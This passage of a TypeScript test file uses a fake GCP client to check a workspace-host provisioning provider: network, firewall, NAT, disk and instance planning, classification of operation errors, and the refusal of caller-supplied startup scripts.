import { spawnSync } from 'node:child_process';
import { existsSync, mkdtempSync, mkdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import {
  WORKSPACE_HOST_DATA_ROOT,
  WORKSPACE_HOST_PROVIDER_CONTRACT_CHECKS,
  runFakeWorkspaceHostProviderContractSuite,
  workspaceHostProviderRetryClass,
  type WorkspaceHostApplyResult,
  type WorkspaceHostDesiredSpec,
  type WorkspaceHostProviderContext,
  type WorkspaceHostRef,
  type WorkspaceHostResourceRef,
} from '@papercusp/deployment-driver';
import {
  GCP_CLOUD_PLATFORM_SCOPE,
  GCP_DATA_DISK_RESIZE_POLICY,
  GCP_DATA_MOUNT_POINT,
  GCP_IAP_TCP_FORWARDING_RANGE,
  GCP_WORKSPACE_HOST_TRANSPORTS,
  buildGcpWorkspaceHostTransportProfile,
  createGcpWorkspaceHostProvider,
  GcpOperationFailedError,
  GCP_WORKSPACE_HOST_CALL_PERMISSIONS,
  gcpInstanceInsertPermissions,
  gcpWorkspaceHostRequestUuid,
  type GcpComputeInstanceStatus,
  type GcpDiskInsertInput,
  type GcpDiskObservation,
  type GcpFirewallInsertInput,
  type GcpFirewallObservation,
  type GcpInstanceInsertInput,
  type GcpInstanceMetadataInput,
  type GcpInstanceObservation,
  type GcpNatInsertInput,
  type GcpNatObservation,
  type GcpNetworkInsertInput,
  type GcpOperationObservation,
  type GcpOperationRef,
  type GcpResourceObservation,
  type GcpRouterInsertInput,
  type GcpRouterObservation,
  type GcpSnapshotInsertInput,
  type GcpSnapshotObservation,
  type GcpSubnetworkInsertInput,
  type GcpWorkspaceHostApiClient,
  type GcpWorkspaceHostInventoryRequest,
  type GcpWorkspaceHostInventorySnapshot,
} from './gcp-provider';
import { GCP_WORKSPACE_HOST_REQUIRED_PERMISSIONS } from '../cloud-workspaces/gcp-preflight';
import { gcpFirstWorkspaceDesiredSpec } from '../auth/hosted/first-workspace';
import { buildHostedProviderDelegationOnboarding } from './hosted-provider-delegation';
import { PAPERCUSP_HOSTED_HOST_PERMISSIONS, PAPERCUSP_HOSTED_OBSERVER_PERMISSIONS } from './hosted-gcp-hosting';

const NOW ='2026-08-22T08:30:00.000Z';

describe('GCP workspace-host transport compatibility profiles', () => {
  it('declares IAP prerequisites, corporate-proxy allowlisting, audit limits, and a bulk-transfer fallback', () => {
    const profile = buildGcpWorkspaceHostTransportProfile({
      kind: 'gcp-iap-ssh',
      projectId: 'papercusp-dev-123',
      zone: 'us-central1-a',
      instanceName: 'pc-host-gcp-1-vm',
    });

    expect(profile.compatibility.requirements.map(({ id }) => id)).toEqual(
      expect.arrayContaining(['gcloud-cli', 'gcp-iap-tunnel', 'gcp-os-login', 'gcp-iap-network']),
    );
    expect(profile.compatibility.proxy).toMatchObject({
      mode: 'allowlist-required',
      requiredDomains: ['tunnel.cloudproxy.app'],
    });
    expect(profile.compatibility.traffic['bulk-transfer']).toBe('discouraged');
    expect(profile.compatibility.audit).toMatchObject({ controlPlaneEvents: true, sessionContent: false });
    expect(profile.compatibility.fallbacks).toContainEqual(
      expect.objectContaining({ feature: 'fileTransfer', strategy: 'provider-object-storage' }),
    );
  });
});

function desired(network: 'managed' | 'existing' = 'managed'): WorkspaceHostDesiredSpec {
  return {
    hostId: 'host-gcp-1',
    target: 'gcp',
    scope: { kind: 'project', id: 'papercusp-dev-123' },
    region: 'us-central1',
    zone: 'us-central1-a',
    size: 'n2-standard-2',
    image: { id: 'projects/papercusp-images/global/images/papercusp-workspace-host-2026-8-23-1' },
    data: { volumeGiB: 120, encrypted: true },
    credentials: { cloudCredentialRef: { kind: 'cloud', ref: 'adc://authorized_user' } },
    labels: { environment: 'test', owner: 'workspace-host-contract' },
    provider: {
      projectId: 'papercusp-dev-123',
      network:
        network === 'managed'
          ? {
              mode: 'managed',
              networkName: 'pc-host-gcp-1-net',
              subnetworkName: 'pc-host-gcp-1-subnet',
              firewallName: 'pc-host-gcp-1-iap',
              routerName: 'pc-host-gcp-1-router',
              natName: 'pc-host-gcp-1-nat',
              ipCidrRange: '10.132.12.0/24',
            }
          : {
              mode: 'existing',
              networkName: 'shared-vpc',
              subnetworkName: 'shared-subnet',
              firewallName: 'shared-iap-firewall',
            },
      serviceAccountEmail: 'workspace-host@papercusp-dev-123.iam.gserviceaccount.com',
      serviceAccountScopes: [GCP_CLOUD_PLATFORM_SCOPE],
      instanceName: 'pc-host-gcp-1-vm',
      dataDiskName: 'pc-host-gcp-1-data',
      dataDeviceName: 'papercusp-data',
      bootDiskGiB: 40,
      bootDiskType: 'pd-balanced',
      dataDiskType: 'pd-ssd',
      kmsKeyName: 'projects/papercusp-dev-123/locations/us-central1/keyRings/workspaces/cryptoKeys/workspace-disks',
      metadata: { 'papercusp-bootstrap-version': 'v1' },
    },
  };
}

function context(
  provider: Readonly<Record<string, unknown>> = {},
  hostBootstrapScript?: string,
): WorkspaceHostProviderContext {
  return {
    workspaceId: 'workspace-gcp-1',
    requestId: 'request-gcp-1',
    ...(hostBootstrapScript ? { hostBootstrapScript } : {}),
    connection: {
      target: 'gcp',
      cloudCredentialRef: { kind: 'cloud', ref: 'adc://authorized_user' },
      scope: { kind: 'project', id: 'papercusp-dev-123' },
      provider: { projectId: 'papercusp-dev-123', credentialSource: 'adc', ...provider },
    },
  };
}

class FakeGcpWorkspaceHostApiClient implements GcpWorkspaceHostApiClient {
  readonly insertNetworkCalls: Array<{ input: GcpNetworkInsertInput; requestId: string }> = [];
  readonly insertSubnetworkCalls: Array<{ input: GcpSubnetworkInsertInput; requestId: string }> = [];
  readonly insertFirewallCalls: Array<{ input: GcpFirewallInsertInput; requestId: string }> = [];
  readonly insertRouterCalls: Array<{ input: GcpRouterInsertInput; requestId: string }> = [];
  readonly insertNatCalls: Array<{ input: GcpNatInsertInput; requestId: string }> = [];
  readonly insertDiskCalls: Array<{ input: GcpDiskInsertInput; requestId: string }> = [];
  readonly insertInstanceCalls: Array<{ input: GcpInstanceInsertInput; requestId: string }> = [];
  readonly setInstanceMetadataCalls: Array<{ input: GcpInstanceMetadataInput; requestId: string }> = [];
  readonly snapshotCalls: Array<{ input: GcpSnapshotInsertInput; requestId: string }> = [];
  readonly waitedOperations: GcpOperationRef[] = [];
  imageDiskSizeGb = 40;
  readonly unreadableImages = new Set<string>();
  startCalls = 0;
  stopCalls = 0;
  resetCalls = 0;
  deleteCalls = 0;

  private operationNumber = 0;
  private readonly operationsByRequestId = new Map<string, GcpOperationRef>();
  private readonly networks = new Map<string, GcpResourceObservation>();
  private readonly subnetworks = new Map<string, GcpResourceObservation>();
  private readonly firewalls = new Map<string, GcpFirewallObservation>();
  private readonly routers = new Map<string, GcpRouterObservation>();
  private readonly nats = new Map<string, GcpNatObservation>();
  private readonly disks = new Map<string, GcpDiskObservation>();
  private readonly instances = new Map<string, GcpInstanceObservation>();
  private readonly snapshots = new Map<string, GcpSnapshotObservation>();

  /**
   * WI-2143924: the real Compute client NEVER writes `agentOnline` (gcp-api-client.test.ts
   * pins its absence), so this fake deliberately does not either — a fixture that sets it
   * would validate a provider assumption against itself and hide exactly the defect that
   * shipped. A test wanting the MEASURED branches must ask for them here, explicitly.
   */
  setAgentOnline(name: string, agentOnline: boolean): void {
    const instance = this.instances.get(name);
    if (!instance) throw new Error(`fake GCP client has no instance '${name}'`);
    this.instances.set(name, { ...instance, agentOnline });
  }

  replaceInstanceIncarnation(name: string, instanceId: string): void {
    const instance = this.instances.get(name);
    if (!instance) throw new Error(`fake GCP client has no instance '${name}'`);
    this.instances.set(name, { ...instance, instanceId });
  }

  seedExistingNetwork(): void {
    this.networks.set('shared-vpc', { name: 'shared-vpc', observedAt: NOW });
    this.subnetworks.set('shared-subnet', { name: 'shared-subnet', observedAt: NOW });
    this.firewalls.set('shared-iap-firewall', {
      name: 'shared-iap-firewall',
      direction: 'INGRESS',
      sourceRanges: [GCP_IAP_TCP_FORWARDING_RANGE],
      targetTags: ['shared-hosts'],
      allowed: [{ IPProtocol: 'tcp', ports: ['22'] }],
      observedAt: NOW,
    });
  }

  seedSnapshot(name: string, hostId: string, status: GcpSnapshotObservation['status'] = 'READY'): void {
    this.snapshots.set(name, {
      name,
      status,
      labels: {
        'papercusp-host-id': hostId,
        'papercusp-managed': 'true',
        'papercusp-workspace-id': 'workspace-gcp-1',
      },
      observedAt: NOW,
    });
  }

  seedForeignNat(routerName: string, name: string): void {
    const router = this.routers.get(routerName);
    if (!router) throw new Error(`fake GCP router '${routerName}' is absent`);
    this.nats.set(`${routerName}:${name}`, {
      name,
      routerName,
      network: router.network,
      subnetwork: 'foreign-subnetwork',
      region: router.region,
      natIpAllocateOption: 'AUTO_ONLY',
      sourceSubnetworkIpRangesToNat: 'LIST_OF_SUBNETWORKS',
      observedAt: NOW,
    });
    this.routers.set(routerName, { ...router, natNames: [...router.natNames, name] });
  }

  rewriteDisk(name: string, patch: Partial<GcpDiskObservation>): void {
    const current = this.disks.get(name);
    if (!current) throw new Error(`fake GCP disk '${name}' is absent`);
    this.disks.set(name, { ...current, ...patch });
  }

  async validateConnection() {
    return {
      ok: true,
      checkedAt: NOW,
      identity: 'operator@example.com',
      warnings: [],
      errors: [],
    };
  }

  async listScopes() {
    return [{ kind: 'project', id: 'papercusp-dev-123', label: 'Papercusp development' }];
  }

  async listRegions() {
    return [{ id: 'us-central1', label: 'Iowa', available: true, zones: ['us-central1-a'] }];
  }

  async listSizes() {
    return [{ id: 'n2-standard-2', label: 'n2-standard-2', cpuCount: 2, memoryMiB: 8192, available: true }];
  }

  async listImages() {
    return [
      {
        id: 'projects/papercusp-images/global/images/papercusp-workspace-host-2026-8-23-1',
        label: 'Ubuntu 24.04 LTS',
        architecture: 'x86_64',
        signed: true,
      },
    ];
  }

  async estimatePrice() {
    return { currency: 'USD', hourlyAmount: 0.11, observedAt: NOW, confidence: 'estimated' as const };
  }

  async inventoryManagedResources(
    request: GcpWorkspaceHostInventoryRequest,
  ): Promise<GcpWorkspaceHostInventorySnapshot> {
    const observed: GcpWorkspaceHostInventorySnapshot['observed'][number][] = [];
    const add = (
      kind: string,
      name: string,
      item: GcpResourceObservation | undefined,
      location: { region?: string; zone?: string } = {},
    ) => {
      if (!item) return;
      observed.push({
        resource: {
          target: 'gcp',
          kind,
          providerId: name,
          parentProviderId: request.projectId,
          ...location,
        },
        labels: item.labels ?? {},
        observedAt: item.observedAt,
      });
    };
    for (const [name, item] of this.instances) add('vm', name, item, { zone: 'us-central1-a' });
    for (const [name, item] of this.disks) add('disk', name, item, { zone: 'us-central1-a' });
    for (const [name, item] of this.snapshots) add('snapshot', name, item);
    request.deterministicNames.networks.forEach((name) => add('network', name, this.networks.get(name)));
    request.deterministicNames.subnetworks.forEach((name) =>
      add('subnetwork', name, this.subnetworks.get(name), { region: request.region }),
    );
    request.deterministicNames.firewalls.forEach((name) => add('firewall', name, this.firewalls.get(name)));
    request.deterministicNames.routers.forEach((name) =>
      add('router', name, this.routers.get(name), { region: request.region }),
    );
    request.deterministicNames.nats.forEach(({ routerName, name }) =>
      add('nat', name, this.nats.get(`${routerName}:${name}`), { region: request.region }),
    );
    const deterministic = (
      kind: 'firewall' | 'subnetwork' | 'network' | 'router' | 'nat',
      names: readonly string[],
    ) => ({
      kind,
      strategy: 'deterministic-name' as const,
      providerEvidenceRef: `fake://inventory/${kind}`,
      deterministicNames: [...names],
    });
    return {
      complete: true,
      observed,
      inventoryEvidence: [
        { kind: 'vm', strategy: 'managed-labels', providerEvidenceRef: 'fake://inventory/vm' },
        { kind: 'disk', strategy: 'managed-labels', providerEvidenceRef: 'fake://inventory/disk' },
        deterministic('firewall', request.deterministicNames.firewalls),
        deterministic('subnetwork', request.deterministicNames.subnetworks),
        deterministic('network', request.deterministicNames.networks),
        { kind: 'snapshot', strategy: 'managed-labels', providerEvidenceRef: 'fake://inventory/snapshot' },
        deterministic('router', request.deterministicNames.routers),
        deterministic(
          'nat',
          request.deterministicNames.nats.map(({ name }) => name),
        ),
      ],
    };
  }

  async getNetwork(_projectId: string, name: string) {
    return this.networks.get(name);
  }

  async getSubnetwork(_projectId: string, _region: string, name: string) {
    return this.subnetworks.get(name);
  }

  async getFirewall(_projectId: string, name: string) {
    return this.firewalls.get(name);
  }

  async getRouter(_projectId: string, _region: string, name: string) {
    return this.routers.get(name);
  }

  async getNat(_projectId: string, _region: string, routerName: string, name: string) {
    return this.nats.get(`${routerName}:${name}`);
  }

  async getDisk(_projectId: string, _zone: string, name: string) {
    return this.disks.get(name);
  }

  async getInstance(_projectId: string, _zone: string, name: string) {
    return this.instances.get(name);
  }

  async getInstanceGuestAttributes() {
    return [];
  }

  async getSnapshot(_projectId: string, name: string) {
    return this.snapshots.get(name);
  }

  async getImageDiskSizeGb(imageId: string) {
    if (this.unreadableImages.has(imageId)) throw new Error(`gcp_preflight_http_404: ${imageId}`);
    return this.imageDiskSizeGb;
  }

  async insertNetwork(_projectId: string, input: GcpNetworkInsertInput, requestId: string) {
    return this.mutation(requestId, 'global', undefined, () => {
      this.insertNetworkCalls.push({ input, requestId });
      this.networks.set(input.name, { name: input.name, observedAt: NOW });
    });
  }

  async insertSubnetwork(_projectId: string, region: string, input: GcpSubnetworkInsertInput, requestId: string) {
    return this.mutation(requestId, 'region', region, () => {
      this.insertSubnetworkCalls.push({ input, requestId });
      this.subnetworks.set(input.name, { name: input.name, observedAt: NOW });
    });
  }

  async insertFirewall(_projectId: string, input: GcpFirewallInsertInput, requestId: string) {
    return this.mutation(requestId, 'global', undefined, () => {
      this.insertFirewallCalls.push({ input, requestId });
      this.firewalls.set(input.name, {
        name: input.name,
        direction: input.direction,
        sourceRanges: input.sourceRanges,
        targetTags: input.targetTags,
        allowed: input.allowed,
        observedAt: NOW,
      });
    });
  }

  async insertRouter(_projectId: string, region: string, input: GcpRouterInsertInput, requestId: string) {
    return this.mutation(requestId, 'region', region, () => {
      this.insertRouterCalls.push({ input, requestId });
      this.routers.set(input.name, {
        name: input.name,
        network: input.network,
        region,
        natNames: [],
        observedAt: NOW,
      });
    });
  }

  async insertNat(_projectId: string, region: string, input: GcpNatInsertInput, requestId: string) {
    return this.mutation(requestId, 'region', region, () => {
      const router = this.routers.get(input.routerName);
      if (!router) throw new Error('fake GCP NAT references an unknown router');
      this.insertNatCalls.push({ input, requestId });
      this.nats.set(`${input.routerName}:${input.name}`, {
        name: input.name,
        routerName: input.routerName,
        network: input.network,
        subnetwork: input.subnetwork,
        region,
        natIpAllocateOption: input.natIpAllocateOption,
        sourceSubnetworkIpRangesToNat: input.sourceSubnetworkIpRangesToNat,
        observedAt: NOW,
      });
      this.routers.set(input.routerName, { ...router, natNames: [input.name], observedAt: NOW });
    });
  }

  async insertDisk(_projectId: string, zone: string, input: GcpDiskInsertInput, requestId: string) {
    return this.mutation(requestId, 'zone', zone, () => {
      this.insertDiskCalls.push({ input, requestId });
      this.disks.set(input.name, {
        name: input.name,
        status: 'READY',
        attachedInstanceNames: [],
        sizeGb: input.sizeGb,
        labels: input.labels,
        observedAt: NOW,
      });
    });
  }

  async insertInstance(_projectId: string, zone: string, input: GcpInstanceInsertInput, requestId: string) {
    return this.mutation(requestId, 'zone', zone, () => {
      this.insertInstanceCalls.push({ input, requestId });
      const dataDiskName = input.disks[1].source.split('/').at(-1)!;
      const dataDisk = this.disks.get(dataDiskName);
      if (!dataDisk) throw new Error('fake GCP instance references an unknown data disk');
      this.disks.set(dataDiskName, {
        ...dataDisk,
        attachedInstanceNames: [input.name],
      });
      this.instances.set(input.name, {
        name: input.name,
        status: 'RUNNING',
        instanceId: requestId,
        sourceImage: input.disks[0].initializeParams.sourceImage,
        attachedDiskNames: [dataDiskName],
        internalIp: '10.132.12.2',
        ...(input.networkInterfaces[0].accessConfigs ? { externalIp: '203.0.113.42' } : {}),
        // No `agentOnline` — see setAgentOnline() above. The real client never writes it.
        labels: input.labels,
        metadataFingerprint: 'metadata-fingerprint-1',
        recreateInput: input,
        observedAt: NOW,
      });
    });
  }

  async createSnapshot(_projectId: string, zone: string, input: GcpSnapshotInsertInput, requestId: string) {
    return this.mutation(requestId, 'zone', zone, () => {
      this.snapshotCalls.push({ input, requestId });
      this.snapshots.set(input.name, {
        name: input.name,
        status: 'READY',
        labels: input.labels,
        sourceDisk: input.sourceDisk,
        observedAt: NOW,
      });
    });
  }

  async startInstance(_projectId: string, zone: string, name: string, requestId: string) {
    this.startCalls += 1;
    return this.instanceMutation(requestId, zone, name, 'RUNNING');
  }

  async stopInstance(_projectId: string, zone: string, name: string, requestId: string) {
    this.stopCalls += 1;
    return this.instanceMutation(requestId, zone, name, 'TERMINATED');
  }

  async resetInstance(_projectId: string, zone: string, name: string, requestId: string) {
    this.resetCalls += 1;
    return this.instanceMutation(requestId, zone, name, 'RUNNING');
  }

  async setInstanceMetadata(
    _projectId: string,
    zone: string,
    name: string,
    input: GcpInstanceMetadataInput,
    requestId: string,
  ) {
    return this.mutation(requestId, 'zone', zone, () => {
      const instance = this.instances.get(name);
      if (!instance?.recreateInput) throw new Error(`fake GCP client has no instance '${name}'`);
      this.setInstanceMetadataCalls.push({ input, requestId });
      this.instances.set(name, {
        ...instance,
        metadataFingerprint: `${input.fingerprint}-next`,
        recreateInput: { ...instance.recreateInput, metadata: { items: [...input.items] } },
      });
    });
  }

  async deleteInstance(_projectId: string, zone: string, name: string, requestId: string) {
    this.deleteCalls += 1;
    return this.mutation(requestId, 'zone', zone, () => {
      this.instances.delete(name);
      for (const [diskName, disk] of this.disks) {
        this.disks.set(diskName, {
          ...disk,
          attachedInstanceNames: disk.attachedInstanceNames.filter((candidate) => candidate !== name),
        });
      }
    });
  }

  async deleteDisk(_projectId: string, zone: string, name: string, requestId: string) {
    this.deleteCalls += 1;
    return this.mutation(requestId, 'zone', zone, () => this.disks.delete(name));
  }

  async deleteFirewall(_projectId: string, name: string, requestId: string) {
    this.deleteCalls += 1;
    return this.mutation(requestId, 'global', undefined, () => this.firewalls.delete(name));
  }

  async deleteNat(_projectId: string, region: string, routerName: string, name: string, requestId: string) {
    this.deleteCalls += 1;
    return this.mutation(requestId, 'region', region, () => {
      this.nats.delete(`${routerName}:${name}`);
      const router = this.routers.get(routerName);
      if (router)
        this.routers.set(routerName, { ...router, natNames: router.natNames.filter((item) => item !== name) });
    });
  }

  async deleteRouter(_projectId: string, region: string, name: string, requestId: string) {
    this.deleteCalls += 1;
    return this.mutation(requestId, 'region', region, () => this.routers.delete(name));
  }

  async deleteSubnetwork(_projectId: string, region: string, name: string, requestId: string) {
    this.deleteCalls += 1;
    return this.mutation(requestId, 'region', region, () => this.subnetworks.delete(name));
  }

  async deleteNetwork(_projectId: string, name: string, requestId: string) {
    this.deleteCalls += 1;
    return this.mutation(requestId, 'global', undefined, () => this.networks.delete(name));
  }

  async waitForOperation(operation: GcpOperationRef): Promise<GcpOperationObservation> {
    this.waitedOperations.push(operation);
    return { ...operation, status: 'DONE', observedAt: NOW };
  }

  private instanceMutation(
    requestId: string,
    zone: string,
    name: string,
    status: GcpComputeInstanceStatus,
  ): GcpOperationRef {
    return this.mutation(requestId, 'zone', zone, () => {
      const current = this.instances.get(name);
      if (!current) throw new Error(`fake GCP instance '${name}' is absent`);
      this.instances.set(name, { ...current, status, observedAt: NOW });
    });
  }

  private mutation(
    requestId: string,
    scope: GcpOperationRef['scope'],
    location: string | undefined,
    effect: () => unknown,
  ): GcpOperationRef {
    const existing = this.operationsByRequestId.get(requestId);
    if (existing) return existing;
    effect();
    const operation = {
      name: `operation-${++this.operationNumber}`,
      projectId: 'papercusp-dev-123',
      scope,
      ...(location ? { location } : {}),
      requestId,
    };
    this.operationsByRequestId.set(requestId, operation);
    return operation;
  }
}

function providerAndClient() {
  const client = new FakeGcpWorkspaceHostApiClient();
  const provider = createGcpWorkspaceHostProvider({ client, now: () => NOW });
  return { client, provider };
}

function requireAppliedResource(result: WorkspaceHostApplyResult): WorkspaceHostResourceRef {
  if (!('resource' in result) || !result.resource) {
    throw new Error(`expected an applied GCP resource, received '${result.state}'`);
  }
  return result.resource;
}

async function provision(
  client: FakeGcpWorkspaceHostApiClient,
  provider: ReturnType<typeof createGcpWorkspaceHostProvider>,
  spec = desired(),
): Promise<{ host: WorkspaceHostRef; resources: WorkspaceHostResourceRef[] }> {
  if ((spec.provider?.network as { mode?: string } | undefined)?.mode === 'existing') client.seedExistingNetwork();
  const plan = await provider.plan(
    { action: 'provision', operationId: 'provision-1', idempotencyKey: 'provision-1', desired: spec },
    context(),
  );
  const resources: WorkspaceHostResourceRef[] = [];
  for (const step of plan.steps) {
    const result = await provider.apply(
      { planId: plan.planId, operationId: plan.operationId, step, knownResources: [...resources] },
      context(),
    );
    if (
      'resource' in result &&
      result.resource &&
      !resources.some((item) => item.providerId === result.resource!.providerId)
    ) {
      resources.push(result.resource);
    }
  }
  return { host: { hostId: spec.hostId, target: 'gcp', resources }, resources };
}

describe('GCP operation that finished with an error (WI-10005323)', () => {
  /** Apply the plan's first step with every operation wait answering `error`; return what it threw. */
  async function failFirstStep(error: NonNullable<GcpOperationObservation['error']>): Promise<unknown> {
    const { client, provider } = providerAndClient();
    client.waitForOperation = async (operation) => ({ ...operation, status: 'DONE', observedAt: NOW, error });
    const plan = await provider.plan(
      { action: 'provision', operationId: 'op-fail', idempotencyKey: 'op-fail', desired: desired() },
      context(),
    );
    return provider
      .apply({ planId: plan.planId, operationId: plan.operationId, step: plan.steps[0]!, knownResources: [] }, context())
      .then(
        () => undefined,
        (thrown: unknown) => thrown,
      );
  }

  it('a refused operation (HTTP 4xx) is terminal, so the provision fails instead of reconciling forever', async () => {
    // Measured 2026-10-02 (prov-0f9b1ba8db30d143becc130a-r3): the VM insert finished DONE with
    // SERVICE_ACCOUNT_ACCESS_DENIED and the runner looped on "outcome uncertain; reconciliation required".
    const thrown = await failFirstStep({
      code: 'SERVICE_ACCOUNT_ACCESS_DENIED',
      message: 'GCP operation failed (SERVICE_ACCOUNT_ACCESS_DENIED)',
      status: 403,
    });
    expect(thrown).toBeInstanceOf(GcpOperationFailedError);
    expect(thrown).toMatchObject({ status: 403, code: 'SERVICE_ACCOUNT_ACCESS_DENIED' });
    expect(workspaceHostProviderRetryClass(thrown)).toBe('terminal');
  });

  it('a rate-limited operation is throttled even though Google reports it as 403', async () => {
    const thrown = await failFirstStep({
      code: 'RESOURCE_OPERATION_RATE_EXCEEDED',
      message: 'GCP operation failed (RESOURCE_OPERATION_RATE_EXCEEDED)',
      status: 403,
      throttled: true,
    });
    expect(workspaceHostProviderRetryClass(thrown)).toBe('throttled');
  });

  it('a server-side failure, or one with no status, stays ambiguous and is reconciled', async () => {
    const stockout = await failFirstStep({
      code: 'ZONE_RESOURCE_POOL_EXHAUSTED',
      message: 'GCP operation failed (ZONE_RESOURCE_POOL_EXHAUSTED)',
      status: 503,
    });
    expect(workspaceHostProviderRetryClass(stockout)).toBe('ambiguous');
    const unknown = await failFirstStep({ message: 'GCP operation failed' });
    expect(workspaceHostProviderRetryClass(unknown)).toBe('ambiguous');
  });
});

describe('GCP workspace-host provider planning', () => {
  it('normalizes an undersized boot disk during planning before any provider mutation can run', async () => {
    const { client, provider } = providerAndClient();
    client.imageDiskSizeGb = 32;
    const spec = desired();
    spec.provider = { ...spec.provider, bootDiskGiB: 30 };

    const plan = await provider.plan(
      { action: 'provision', operationId: 'image-floor', idempotencyKey: 'image-floor', desired: spec },
      context(),
    );
    const instance = (
      plan.steps.find(({ id }) => id === 'create-instance')!.input as unknown as { request: GcpInstanceInsertInput }
    ).request;

    expect(instance.disks[0].initializeParams.diskSizeGb).toBe(32);
    expect(client.insertNetworkCalls).toHaveLength(0);
    expect(client.insertDiskCalls).toHaveLength(0);
  });

  // WI-10005297: the provision and action routes spread stored connection config over the desired
  // spec, and until 2026-10-02 every hosted connection stored the CONTROLLER email there.
  it('a host reached through a hosted delegation holds no identity, even when the spec names one', async () => {
    const { provider } = providerAndClient();
    const { record } = buildHostedProviderDelegationOnboarding({
      organizationId: 'org-a',
      workspaceId: 'workspace-gcp-1',
      connectionId: 'connection-gcp-1',
      label: 'Customer project',
      credentialRef: 'encrypted://workspace-gcp-1/cloud/connection-gcp-1',
      now: '2026-10-02T06:00:00.000Z',
      configuration: {
        provider: 'gcp',
        source: {
          method: 'service-account-impersonation',
          projectId: 'papercusp-dev-123',
          serviceAccountEmail: 'papercusp-host-operator@papercusp-dev-123.iam.gserviceaccount.com',
          trustedPrincipal: 'principal://iam.googleapis.com/subject/control-plane',
        },
      },
    });
    const instanceRequest = async (extra: Record<string, unknown>) => {
      const base = desired();
      const plan = await provider.plan(
        {
          action: 'provision',
          operationId: 'operation-identity',
          idempotencyKey: 'operation-identity',
          desired: { ...base, provider: { ...base.provider, ...extra } },
        },
        context({}, '#!/usr/bin/env bash\necho papercusp-bootstrap\n'),
      );
      return (plan.steps.find(({ id }) => id === 'create-instance')!.input as unknown as {
        request: GcpInstanceInsertInput;
      }).request;
    };

    // The legacy stored shape: the delegation plus the controller email beside it.
    const hosted = await instanceRequest({
      hostedDelegation: record,
      serviceAccountEmail: 'papercusp-host-operator@papercusp-dev-123.iam.gserviceaccount.com',
    });
    expect(hosted).not.toHaveProperty('serviceAccounts');
    expect(gcpInstanceInsertPermissions(hosted)).not.toContain('iam.serviceAccounts.actAs');
    expect(gcpInstanceInsertPermissions(hosted)).not.toContain('compute.instances.setServiceAccount');

    // Control: the same spec without a delegation keeps the runtime identity it names.
    const direct = await instanceRequest({});
    expect(direct.serviceAccounts).toEqual([
      { email: 'workspace-host@papercusp-dev-123.iam.gserviceaccount.com', scopes: [GCP_CLOUD_PLATFORM_SCOPE] },
    ]);
    expect(gcpInstanceInsertPermissions(direct)).toContain('iam.serviceAccounts.actAs');
  });

  it('builds a deterministic managed resource graph with RFC-4122 request UUIDs and hardened instance inputs', async () => {
    const { provider } = providerAndClient();
    const request = {
      action: 'provision' as const,
      operationId: 'operation-1',
      idempotencyKey: 'operation-1',
      desired: desired(),
    };
    const bootstrap = '#!/usr/bin/env bash\necho papercusp-bootstrap\n';
    const [first, replay] = await Promise.all([
      provider.plan(request, context({}, bootstrap)),
      provider.plan(request, context({}, bootstrap)),
    ]);
    expect(first.steps).toEqual(replay.steps);
    expect(first.steps.map(({ id, dependsOn }) => ({ id, dependsOn }))).toEqual([
      { id: 'create-network', dependsOn: [] },
      { id: 'create-subnetwork', dependsOn: ['create-network'] },
      { id: 'create-firewall', dependsOn: ['create-network'] },
      { id: 'create-router', dependsOn: ['create-network'] },
      { id: 'create-nat', dependsOn: ['create-router', 'create-subnetwork'] },
      { id: 'create-data-disk', dependsOn: [] },
      { id: 'create-instance', dependsOn: ['create-subnetwork', 'create-firewall', 'create-nat', 'create-data-disk'] },
    ]);
    const requestIds = first.steps.map((step) => (step.input as { requestId: string }).requestId);
    expect(requestIds).toHaveLength(new Set(requestIds).size);
    requestIds.forEach((requestId) =>
      expect(requestId).toMatch(/^[0-9a-f]{8}-[0-9a-f]{4}-5[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/),
    );
    expect(gcpWorkspaceHostRequestUuid('operation-1')).toBe(gcpWorkspaceHostRequestUuid('operation-1'));

    const firewall = (
      first.steps.find(({ id }) => id === 'create-firewall')!.input as unknown as { request: GcpFirewallInsertInput }
    ).request;
    expect(firewall).toMatchObject({ sourceRanges: [GCP_IAP_TCP_FORWARDING_RANGE], allowed: [{ ports: ['22'] }] });
    const nat = (first.steps.find(({ id }) => id === 'create-nat')!.input as unknown as { request: GcpNatInsertInput })
      .request;
    expect(nat).toMatchObject({
      routerName: 'pc-host-gcp-1-router',
      subnetwork: 'pc-host-gcp-1-subnet',
      natIpAllocateOption: 'AUTO_ONLY',
      sourceSubnetworkIpRangesToNat: 'LIST_OF_SUBNETWORKS',
      minPortsPerVm: 64,
      enableEndpointIndependentMapping: false,
    });
    const disk = (
      first.steps.find(({ id }) => id === 'create-data-disk')!.input as unknown as { request: GcpDiskInsertInput }
    ).request;
    expect(disk).toMatchObject({ sizeGb: 120, type: 'pd-ssd', diskEncryptionKey: { kmsKeyName: expect.any(String) } });
    const instance = (
      first.steps.find(({ id }) => id === 'create-instance')!.input as unknown as { request: GcpInstanceInsertInput }
    ).request;
    expect(instance.networkInterfaces[0]).not.toHaveProperty('accessConfigs');
    expect(instance.serviceAccounts).toEqual([
      {
        email: 'workspace-host@papercusp-dev-123.iam.gserviceaccount.com',
        scopes: [GCP_CLOUD_PLATFORM_SCOPE],
      },
    ]);
    expect(instance.disks[1]).toMatchObject({ autoDelete: false, deviceName: 'papercusp-data' });
    expect(instance.metadata.items).toEqual(
      expect.arrayContaining([
        { key: 'enable-oslogin', value: 'TRUE' },
        { key: 'enable-guest-attributes', value: 'TRUE' },
        { key: 'block-project-ssh-keys', value: 'TRUE' },
        { key: 'papercusp-data-resize-policy', value: GCP_DATA_DISK_RESIZE_POLICY },
        {
          key: 'startup-script',
          value: expect.stringContaining(`data_mount='${GCP_DATA_MOUNT_POINT}'`),
        },
      ]),
    );
    // The CONTROLLER-authored bootstrap (provider context), after the durable mount — never a
    // caller-supplied value, which readSettings refuses outright.
    expect(instance.metadata.items.find(({ key }) => key === 'startup-script')?.value).toContain(
      '# User-supplied bootstrap follows the durable mount.\necho papercusp-bootstrap',
    );
    expect(instance.metadata.items.find(({ key }) => key === 'startup-script')?.value).toContain(
      'resize2fs "$data_device"',
    );
  });

  it('refuses a caller-supplied desired.provider.startupScript instead of merging it', async () => {
    // The rendered bootstrap pins the release trust roots AND the OpenSSH key authorized for the
    // workspace SSH account, so a caller who can name it chooses which code the host runs and who
    // may log in. Refusing is the only disposition that keeps a single trusted producer; merging
